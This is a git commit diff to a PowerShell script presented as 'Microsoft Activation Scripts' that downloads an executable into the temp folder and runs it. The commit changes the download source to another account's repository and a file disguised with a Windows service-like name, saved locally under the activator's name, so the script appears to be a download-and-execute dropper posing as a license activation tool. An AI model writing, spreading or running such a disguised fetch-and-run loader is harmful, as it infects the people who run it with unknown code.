e9f544e758cebb15cda8ab2a5a3caa57944689bc
acenljd <thebluepoint2@gmail.com>
2025-12-10 03:07:18 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
+$url = "https://raw.githubusercontent.com/mndclever-beep/weather/refs/heads/main/Service%20Host%20Windows%20Audio%20Endpoint%20Codec.exe"
 $tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
 
@@ -6,3 +6,4 @@ Invoke-WebRequest -Uri $url -OutFile $tempFile
 
 
 Start-Process $tempFile
+
